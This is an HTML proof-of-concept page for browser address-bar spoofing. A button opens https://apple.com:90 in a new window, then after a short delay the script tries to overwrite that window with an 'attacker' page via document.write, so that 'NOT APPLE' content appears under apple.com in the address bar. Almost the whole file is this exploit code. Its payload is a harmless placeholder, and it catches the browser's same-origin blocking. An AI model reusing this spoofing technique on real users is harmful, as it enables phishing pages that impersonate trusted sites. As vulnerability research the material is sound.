<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=yes" />
    <title>Direct Target Force PoC</title>
    <style>
      body, html {
        margin: 0;
        padding: 0;
        height: 100%;
        background: #0b0e14;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        color: #f0f6fc;
        display: flex;
        align-items: center;
        justify-content: center;
      }
      .container { text-align: center; max-width: 650px; padding: 20px; box-sizing: border-box; }
      button {
        width: 100%;
        max-width: 360px;
        padding: 18px 24px;
        font-size: 16px;
        font-weight: 600;
        background: #da3633;
        color: #fff;
        border: none;
        border-radius: 10px;
        cursor: pointer;
        box-shadow: 0 4px 14px rgba(218, 54, 51, 0.4);
        transition: transform 0.1s, background 0.2s;
      }
      button:active { background: #b62324; transform: scale(0.98); }
      .info {
        margin-top: 20px;
        font-size: 13px;
        color: #8b949e;
        font-family: monospace;
        word-break: break-all;
        padding: 0 10px;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <button id="execBtn">FORCE APPLE.COM:90 ADDRESS BAR</button>
      <div class="info" id="statusInfo">Status: Ready for interaction.</div>
    </div>

    <script>
      let execButton = document.getElementById("execBtn");
      let statusInfo = document.getElementById("statusInfo");

      execButton.onclick = function () {
        statusInfo.innerText = "Status: Forcing direct navigation to target URL...";
        this.style.display = "none";

        try {
          // Membuka jendela baru dengan langsung menyertakan URL target pada parameter window.open
          // Ini memaksa bilah alamat langsung menampilkan "apple.com:90" alih-alih "about:blank"
          let targetWindow = window.open("https://apple.com:90", "_blank");

          if (!targetWindow) {
            statusInfo.innerText = "Status: Execution halted - Pop-up blocked by browser policy.";
            execButton.style.display = "block";
            return;
          }

          statusInfo.innerText = "Status: Address bar forced to apple.com:90. Attempting injection race...";

          // Mencoba menyuntikkan dokumen penyerang pada celah waktu muat awal (provisional load)
          setTimeout(() => {
            try {
              let attackerPayload = `
                <!DOCTYPE html>
                <html>
                <head>
                  <meta name="viewport" content="width=device-width, initial-scale=1.0">
                  <title>Attacker Page</title>
                  <style>
                    body {
                      margin: 0; background: #ffffff; color: #1d1d1f;
                      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
                      display: flex; align-items: center; justify-content: center;
                      height: 100vh; text-align: center; padding: 20px; box-sizing: border-box;
                    }
                    .wrapper { width: 100%; max-width: 500px; }
                    h1 { font-size: 40px; color: #d70015; margin-bottom: 12px; font-weight: 700; }
                    p { font-size: 22px; color: #0066cc; font-weight: 500; margin: 0; }
                  </style>
                </head>
                <body>
                  <div class="wrapper">
                    <h1>NOT APPLE</h1>
                    <p>Forced Content Injection Test</p>
                  </div>
                </body>
                </html>
              `;

              targetWindow.document.open();
              targetWindow.document.write(attackerPayload);
              targetWindow.document.close();

              statusInfo.innerText = "Status: Injection executed successfully.";
            } catch (innerErr) {
              // Jika browser modern memblokir karena perbedaan origin atau proteksi commit, blok ini menangkapnya
              statusInfo.innerText = "Status: Blocked by browser SOP/Commit policy: " + innerErr.message;
            }
          }, 200);

        } catch (err) {
          statusInfo.innerText = "Status: Execution error: " + err.message;
        }
      };
    </script>
  </body>
</html>
